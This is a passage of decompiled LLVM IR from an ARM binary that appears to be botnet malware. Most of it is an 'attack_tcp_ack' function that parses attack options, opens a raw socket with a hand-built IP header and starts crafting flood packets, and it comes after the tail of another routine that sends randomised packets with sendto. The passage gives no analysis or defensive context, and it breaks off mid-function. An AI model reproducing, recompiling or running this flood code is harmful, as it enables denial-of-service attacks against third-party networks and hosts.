  %v2_a7e8 = inttoptr i32 %v1_a7e8 to i16*
  %v3_a7e8 = load i16, i16* %v2_a7e8, align 2
  %v4_a7e8 = zext i16 %v3_a7e8 to i32
  store i32 %v4_a7e8, i32* @r5, align 4
  %v1_a7ec = load i32, i32* %ip.global-to-local, align 4
  %v2_a7ec = add i32 %v1_a7ec, %v5_a7e4
  store i32 %v2_a7ec, i32* @lr, align 4
  %v3_a7f0 = add i32 %v2_a7ec, 2
  %v4_a7f0 = inttoptr i32 %v3_a7f0 to i16*
  store i16 %v3_a7e8, i16* %v4_a7f0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @r4, align 4
  store i32 %v0_a7fc, i32* %r1.global-to-local, align 4
  %v0_a800 = load i32, i32* @sb, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  %v0_a804 = load i32, i32* @r7, align 4
  store i32 %v0_a804, i32* %r2.global-to-local, align 4
  %v0_a808 = load i32, i32* @lr, align 4
  %v6_a810 = call i32 @__libc_sendto(i32 %v0_a800, i32 %v0_a7fc, i32 %v0_a804, i32 16384, i32 %v0_a808, i32 16)
  %v3_a814 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a814, i32* %r3.global-to-local, align 4
  %v1_a818 = add i32 %v3_a814, 1
  store i32 %v1_a818, i32* %r0.global-to-local, align 4
  %v0_a81c = load i32, i32* @r6, align 4
  %v9_a81c = icmp eq i32 %v0_a81c, %v1_a818
  store i1 %v9_a81c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a818, i32* %stack_var_-44, align 4
  %v8_a824 = icmp sgt i32 %v0_a81c, %v1_a818
  br i1 %v8_a824, label %dec_label_pc_a730, label %dec_label_pc_a828

dec_label_pc_a828:                                ; preds = %dec_label_pc_a758
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a82c = icmp eq i32 %v0_a81c, 0
  store i1 %v2_a82c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a82c, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a83c:                                ; preds = %dec_label_pc_a730
  %v0_a83c = call i32 @rand_next()
  %v1_a83c = trunc i32 %v0_a83c to i16
  store i32 %v0_a83c, i32* %r0.global-to-local, align 4
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  %v3_a848 = load i32, i32* @r4, align 4
  %v4_a848 = add i32 %v3_a848, 4
  %v5_a848 = inttoptr i32 %v4_a848 to i16*
  store i16 %v1_a83c, i16* %v5_a848, align 2
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a83c.dec_label_pc_a850_crit_edge

dec_label_pc_a83c.dec_label_pc_a850_crit_edge:    ; preds = %dec_label_pc_a83c
  %v0_a850.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a850

dec_label_pc_a850:                                ; preds = %dec_label_pc_a83c.dec_label_pc_a850_crit_edge, %dec_label_pc_a74c
  %v0_a850 = phi i32 [ %v0_a850.pre, %dec_label_pc_a83c.dec_label_pc_a850_crit_edge ], [ %v7_a738, %dec_label_pc_a74c ]
  %v1_a850 = add i32 %v0_a850, 40
  store i32 %v1_a850, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v2_a858 = inttoptr i32 %v1_a850 to i16*
  %v3_a858 = call i32 @rand_str(i16* %v2_a858, i32 %v6_a250)
  store i32 %v3_a858, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a758

; uselistorder directives
  uselistorder i32 %v0_a83c, { 1, 0 }
  uselistorder i32 %v1_a818, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a7e4, { 1, 0 }
  uselistorder i32 %v4_a7d0, { 1, 0 }
  uselistorder i32 %v3_a79c, { 1, 0 }
  uselistorder i32 %v3_a77c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_a768, { 1, 0 }
  uselistorder i1 %v2_a844, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a654, { 1, 0 }
  uselistorder i32 %v0_a58c, { 1, 0 }
  uselistorder i32 %v3_a528, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_a4fc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_a4e0, { 1, 0 }
  uselistorder i32 %v0_a49c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a44c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a438, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_a3c4, { 1, 0 }
  uselistorder i32 %v6_a3bc, { 0, 2, 1, 3 }
  uselistorder i1 %v9_a3ec, { 1, 0 }
  uselistorder i32 %v4_a400, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a348, { 1, 0, 2 }
  uselistorder i32 %v0_a4f8, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_a338, { 1, 0 }
  uselistorder i1 %v7_a330, { 1, 0, 2 }
  uselistorder i1 %v7_a2e4, { 1, 0 }
  uselistorder i32 %v3_a2e0, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i32 %v1_a690, { 1, 0 }
  uselistorder i32 %v1_a678, { 1, 0 }
  uselistorder i32 %v1_a660, { 1, 0 }
  uselistorder i32 %v3_a3f8, { 1, 0 }
  uselistorder i1 %v2_a414, { 1, 0 }
  uselistorder i32 %v1_a410, { 1, 0 }
  uselistorder i32 %v4_a40c, { 2, 0, 1 }
  uselistorder i32 %v2_a320, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_a2bc, { 1, 0 }
  uselistorder i1 %v7_a2b4, { 1, 0 }
  uselistorder i1 %v7_a288, { 1, 0 }
  uselistorder i32 %v3_a284, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_a270, { 2, 3, 1, 0 }
  uselistorder i32 %v6_a250, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_a238, { 1, 2, 0 }
  uselistorder i32 %v1_a218, { 1, 2, 0 }
  uselistorder i32 %v1_a1f8, { 1, 2, 0 }
  uselistorder i32 %v1_a1d8, { 1, 2, 0 }
  uselistorder i32 %v1_a1b8, { 1, 2, 0 }
  uselistorder i32 %v1_a198, { 1, 2, 0 }
  uselistorder i32 %v6_a174, { 1, 0 }
  uselistorder i32 %v1_a15c, { 1, 2, 0 }
  uselistorder i32 %v6_a0f4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_a0dc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_a0cc, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 50, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 56, 55, 2, 1, 3, 5, 4, 7, 6, 9, 8, 14, 10, 11, 12, 13, 17, 15, 16, 19, 18, 20, 23, 22, 21, 24, 25, 26, 28, 29, 27, 30, 32, 31, 33, 34, 35, 37, 36, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 and (i32 ptrtoint (i32* @global_var_ff00.33 to i32), i32 16776960), { 1, 2, 0, 4, 5, 3 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a758, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
  uselistorder label %dec_label_pc_a71c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a70c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_a478, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a448, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a384, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
  uselistorder label %dec_label_pc_a340, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_a864 = load i32, i32* @sb, align 4
  %v24_a864 = load i32, i32* @fp, align 4
  %v27_a864 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_a880 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a884 = load i32, i32* @r5, align 4
  store i32 %v0_a884, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a894 = load i32, i32* @r4, align 4
  store i32 %v0_a894, i32* %r0.global-to-local, align 4
  %v5_a898 = inttoptr i32 %v0_a884 to i32*
  %v6_a898 = call i32 @attack_get_opt_int(i32 %v0_a894, i32* %v5_a898, i32 2, i32 0, i32 %v2_a880)
  %v1_a8a4 = urem i32 %v6_a898, 256
  store i32 %v1_a8a4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i32, i32* @r5, align 4
  store i32 %v0_a8b0, i32* %r1.global-to-local, align 4
  %v0_a8b4 = load i32, i32* @r4, align 4
  store i32 %v0_a8b4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a898, 16777216
  %v5_a8bc = sdiv i32 %sext, 16777216
  %v6_a8bc = inttoptr i32 %v0_a8b0 to i32*
  %v7_a8bc = call i32 @attack_get_opt_int(i32 %v0_a8b4, i32* %v6_a8bc, i32 3, i32 65535, i32 %v5_a8bc)
  %v0_a8c0 = load i32, i32* @r5, align 4
  store i32 %v0_a8c0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8bc, i32* %sb.global-to-local, align 4
  %v0_a8d0 = load i32, i32* @r4, align 4
  store i32 %v0_a8d0, i32* %r0.global-to-local, align 4
  %v5_a8d4 = inttoptr i32 %v0_a8c0 to i32*
  %v6_a8d4 = call i32 @attack_get_opt_int(i32 %v0_a8d0, i32* %v5_a8d4, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a8dc = urem i32 %v6_a8d4, 256
  store i32 %v1_a8dc, i32* %ip.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8ec = load i32, i32* @r4, align 4
  store i32 %v0_a8ec, i32* %r0.global-to-local, align 4
  %sext4 = mul i32 %v6_a8d4, 16777216
  %v5_a8f4 = sdiv i32 %sext4, 16777216
  %v6_a8f4 = inttoptr i32 %v0_a8e0 to i32*
  %v7_a8f4 = call i32 @attack_get_opt_int(i32 %v0_a8ec, i32* %v6_a8f4, i32 5, i32 0, i32 %v5_a8f4)
  %v1_a900 = urem i32 %v7_a8f4, 256
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a90c = load i32, i32* @r5, align 4
  store i32 %v0_a90c, i32* %r1.global-to-local, align 4
  %v0_a910 = load i32, i32* @r4, align 4
  store i32 %v0_a910, i32* %r0.global-to-local, align 4
  %v5_a918 = inttoptr i32 %v0_a90c to i32*
  %v6_a918 = call i32 @attack_get_opt_int(i32 %v0_a910, i32* %v5_a918, i32 6, i32 65535, i32 %v1_a900)
  %v0_a920 = load i32, i32* @r5, align 4
  store i32 %v0_a920, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a918, i32* @r6, align 4
  %v0_a930 = load i32, i32* @r4, align 4
  store i32 %v0_a930, i32* %r0.global-to-local, align 4
  %v5_a934 = inttoptr i32 %v0_a920 to i32*
  %v6_a934 = call i32 @attack_get_opt_int(i32 %v0_a930, i32* %v5_a934, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_a934, i32* @sl, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  %v5_a950 = inttoptr i32 %v0_a93c to i32*
  %v6_a950 = call i32 @attack_get_opt_int(i32 %v0_a94c, i32* %v5_a950, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a95c = load i32, i32* @r5, align 4
  store i32 %v0_a95c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a968 = load i32, i32* @r4, align 4
  store i32 %v0_a968, i32* %r0.global-to-local, align 4
  %v5_a96c = inttoptr i32 %v0_a95c to i32*
  %v6_a96c = call i32 @attack_get_opt_int(i32 %v0_a968, i32* %v5_a96c, i32 18, i32 65535, i32 %v6_a950)
  %v0_a970 = load i32, i32* @r5, align 4
  store i32 %v0_a970, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a980 = load i32, i32* @r4, align 4
  store i32 %v0_a980, i32* %r0.global-to-local, align 4
  %v5_a984 = inttoptr i32 %v0_a970 to i32*
  %v6_a984 = call i32 @attack_get_opt_int(i32 %v0_a980, i32* %v5_a984, i32 11, i32 0, i32 %v6_a96c)
  %v0_a988 = load i32, i32* @r5, align 4
  store i32 %v0_a988, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a998 = load i32, i32* @r4, align 4
  store i32 %v0_a998, i32* %r0.global-to-local, align 4
  %v5_a99c = inttoptr i32 %v0_a988 to i32*
  %v6_a99c = call i32 @attack_get_opt_int(i32 %v0_a998, i32* %v5_a99c, i32 12, i32 1, i32 %v6_a984)
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r4, align 4
  store i32 %v0_a9b0, i32* %r0.global-to-local, align 4
  %v5_a9b4 = inttoptr i32 %v0_a9a0 to i32*
  %v6_a9b4 = call i32 @attack_get_opt_int(i32 %v0_a9b0, i32* %v5_a9b4, i32 13, i32 0, i32 %v6_a99c)
  %v0_a9b8 = load i32, i32* @r5, align 4
  store i32 %v0_a9b8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9c8 = load i32, i32* @r4, align 4
  store i32 %v0_a9c8, i32* %r0.global-to-local, align 4
  %v5_a9cc = inttoptr i32 %v0_a9b8 to i32*
  %v6_a9cc = call i32 @attack_get_opt_int(i32 %v0_a9c8, i32* %v5_a9cc, i32 14, i32 0, i32 %v6_a9b4)
  %v0_a9d0 = load i32, i32* @r5, align 4
  store i32 %v0_a9d0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9e0 = load i32, i32* @r4, align 4
  store i32 %v0_a9e0, i32* %r0.global-to-local, align 4
  %v5_a9e4 = inttoptr i32 %v0_a9d0 to i32*
  %v6_a9e4 = call i32 @attack_get_opt_int(i32 %v0_a9e0, i32* %v5_a9e4, i32 15, i32 0, i32 %v6_a9cc)
  %v0_a9e8 = load i32, i32* @r5, align 4
  store i32 %v0_a9e8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9f8 = load i32, i32* @r4, align 4
  store i32 %v0_a9f8, i32* %r0.global-to-local, align 4
  %v5_a9fc = inttoptr i32 %v0_a9e8 to i32*
  %v6_a9fc = call i32 @attack_get_opt_int(i32 %v0_a9f8, i32* %v5_a9fc, i32 16, i32 0, i32 %v6_a9e4)
  %v0_aa00 = load i32, i32* @r5, align 4
  store i32 %v0_aa00, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_aa10 = load i32, i32* @r4, align 4
  store i32 %v0_aa10, i32* %r0.global-to-local, align 4
  %v5_aa14 = inttoptr i32 %v0_aa00 to i32*
  %v6_aa14 = call i32 @attack_get_opt_int(i32 %v0_aa10, i32* %v5_aa14, i32 0, i32 512, i32 %v6_a9fc)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aa24 = load i32, i32* @r5, align 4
  store i32 %v0_aa24, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* %r0.global-to-local, align 4
  %v5_aa2c = inttoptr i32 %v0_aa24 to i32*
  %v6_aa2c = call i32 @attack_get_opt_int(i32 %v0_aa28, i32* %v5_aa2c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_aa38 = load i32, i32* @global_var_24f40.59, align 4
  store i32 %v2_aa38, i32* %r3.global-to-local, align 4
  %v1_aa3c = urem i32 %v6_aa2c, 256
  store i32 %v1_aa3c, i32* %ip.global-to-local, align 4
  %v0_aa40 = load i32, i32* @r5, align 4
  store i32 %v0_aa40, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v5_aa50 = inttoptr i32 %v0_aa40 to i32*
  %v6_aa50 = call i32 @attack_get_opt_ip(i32 %v0_aa48, i32* %v5_aa50, i32 25, i32 %v2_aa38, i32 %v1_aa3c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_aa64 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v7_aa68 = icmp eq i32 %v3_aa64, -1
  store i1 %v7_aa68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa68, label %dec_label_pc_af30, label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aa7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aa7c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aa90 = call i32 @__GI_setsockopt(i32 %v3_aa64, i32 0, i32 3, i32 %v6_aa7c, i32 4)
  store i32 %v5_aa90, i32* %r0.global-to-local, align 4
  %v7_aa94 = icmp eq i32 %v5_aa90, -1
  store i1 %v7_aa94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa94, label %dec_label_pc_af28, label %dec_label_pc_aa9c

dec_label_pc_aa9c:                                ; preds = %dec_label_pc_aa74
  %v0_aa9c = load i32, i32* %sb.global-to-local, align 4
  %v3_aa9c = mul i32 %v0_aa9c, 65536
  store i32 %v3_aa9c, i32* @r5, align 4
  %v0_aaa0 = load i32, i32* @r6, align 4
  %v0_aaa4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_aaac = urem i32 %v0_aa9c, 65536
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  %v3_aab0 = urem i32 %v0_aaa0, 65536
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v3_aab4 = urem i32 %v0_aaa4, 65536
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v0_aab8 = load i32, i32* @r7, align 4
  %v2_aab8 = icmp eq i32 %v0_aab8, 0
  store i1 %v2_aab8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aab8, label %dec_label_pc_af3c, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aa9c
  %v3_aad4 = mul i32 %v6_aa14, 65536
  %v1_aad8 = add i32 %v3_aad4, 2621440
  store i32 %v1_aad8, i32* @lr, align 4
  %tmp59 = mul i32 %v0_aaa0, 256
  %v3_aafc = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_aaa4, 256
  %v3_ab00 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_aaa0, 256
  %v4_ab04 = urem i32 %tmp61, 256
  %v5_ab04 = or i32 %v4_ab04, %v3_aafc
  store i32 %v5_ab04, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_aaa4, 256
  %v4_ab08 = urem i32 %tmp62, 256
  %v5_ab08 = or i32 %v4_ab08, %v3_ab00
  store i32 %v5_ab08, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_aad8, 256
  %v3_ab1c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_aa9c, 256
  %v3_ab20 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v6_a950, 256
  %v3_ab24 = and i32 %tmp65, 65280
  %v1_ab28 = urem i32 %v6_a984, 2
  %v1_ab2c = urem i32 %v6_a99c, 2
  %tmp66 = udiv i32 %v6_a950, 256
  %v4_ab30 = urem i32 %tmp66, 256
  %v5_ab30 = or i32 %v4_ab30, %v3_ab24
  %v4_ab34 = udiv i32 %v1_aad8, 16777216
  %v5_ab34 = or i32 %v3_ab1c, %v4_ab34
  store i32 %v5_ab34, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_aa9c, 256
  %v4_ab38 = urem i32 %tmp67, 256
  %v5_ab38 = or i32 %v4_ab38, %v3_ab20
  store i32 %v5_ab38, i32* @fp, align 4
  %v1_ab54 = urem i32 %v6_a9b4, 2
  store i32 %v1_ab54, i32* %r2.global-to-local, align 4
  %v1_ab58 = urem i32 %v6_a9cc, 2
  store i32 %v1_ab58, i32* %r3.global-to-local, align 4
  %v1_ab5c = urem i32 %v6_a9e4, 2
  store i32 %v1_ab5c, i32* %ip.global-to-local, align 4
  %v1_ab60 = urem i32 %v6_a9fc, 2
  store i32 %v1_ab60, i32* %r0.global-to-local, align 4
  %v1_ab64 = urem i32 %v6_a9b4, 256
  store i32 %v1_ab64, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %tmp = sub nsw i32 0, %v1_ab2c
  %v4_ac50 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_ab54
  %v4_ac6c = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_ab58
  %v4_ac80 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_ab5c
  %v3_ac94 = and i32 %tmp74, 2
  %v2_acb8 = icmp eq i32 %v1_ab64, 0
  %v1_abe0 = trunc i32 %v5_a8bc to i8
  %extract.t = trunc i32 %v5_a8f4 to i8
  br label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %bb70, %dec_label_pc_aad0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab90 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ab90, i32* %r0.global-to-local, align 4
  %v2_ab98 = load i32, i32* @r4, align 4
  %v5_ab98 = mul i32 %v2_ab98, 4
  %v6_ab98 = add i32 %v5_ab98, %v2_a880
  %v7_ab98 = inttoptr i32 %v6_ab98 to i32*
  store i32 %v2_ab90, i32* %v7_ab98, align 4
  %v3_ab9c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab9c, i32* %r2.global-to-local, align 4
  %v5_aba4 = mul i32 %v3_ab9c, 24
  %v1_aba8 = load i32, i32* @r8, align 4
  %v2_aba8 = add i32 %v1_aba8, %v5_aba4
  store i32 %v2_aba8, i32* %r1.global-to-local, align 4
  store i32 %v2_a880, i32* %r3.global-to-local, align 4
  %v4_abb0 = mul i32 %v3_ab9c, 4
  %v5_abb0 = add i32 %v4_abb0, %v2_a880
  %v6_abb0 = inttoptr i32 %v5_abb0 to i32*
  %v7_abb0 = load i32, i32* %v6_abb0, align 4
  store i32 %v7_abb0, i32* @r5, align 4
  %v1_abb4 = inttoptr i32 %v7_abb0 to i8*
  %v2_abb4 = load i8, i8* %v1_abb4, align 1
  %tmp75 = urem i8 %v2_abb4, 16
  %v1_abb8 = zext i8 %tmp75 to i32
  %v1_abbc = or i32 %v1_abb8, 64
  store i32 %v1_abbc, i32* %r3.global-to-local, align 4
  %v1_abc0 = trunc i32 %v1_abbc to i8
  store i8 %v1_abc0, i8* %v1_abb4, align 1
  %v0_abc4 = load i32, i32* @r5, align 4
  %v1_abc4 = inttoptr i32 %v0_abc4 to i8*
  %v2_abc4 = load i8, i8* %v1_abc4, align 1
  %v1_abc8 = and i8 %v2_abc4, -16
  %v1_abcc = or i8 %v1_abc8, 5
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i8 %v1_abcc, i8* %v1_abc4, align 1
  store i32 %v5_a8bc, i32* %r0.global-to-local, align 4
  %v0_abdc = load i32, i32* %ip.global-to-local, align 4
  %v2_abdc = icmp eq i32 %v0_abdc, 0
  store i1 %v2_abdc, i1* %cpsr_z.global-to-local, align 1
  %v2_abe0 = load i32, i32* @r5, align 4
  %v3_abe0 = add i32 %v2_abe0, 1
  %v4_abe0 = inttoptr i32 %v3_abe0 to i8*
  store i8 %v1_abe0, i8* %v4_abe0, align 1
  store i32 %v5_a8f4, i32* %r2.global-to-local, align 4
  %v0_abe8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abe8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_ab84
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_abec = load i32, i32* @r5, align 4
  %v4_abec = add i32 %v3_abec, 6
  %v5_abec = inttoptr i32 %v4_abec to i16*
  store i16 64, i16* %v5_abec, align 2
  %v0_abf4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_abf4.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ab84, %bb
  %v0_abf4.off0 = phi i8 [ %extract.t, %dec_label_pc_ab84 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_abf4 = load i32, i32* @r5, align 4
  %v3_abf4 = add i32 %v2_abf4, 8
  %v4_abf4 = inttoptr i32 %v3_abf4 to i8*
  store i8 %v0_abf4.off0, i8* %v4_abf4, align 1
  %v0_abf8 = load i32, i32* %r3.global-to-local, align 4
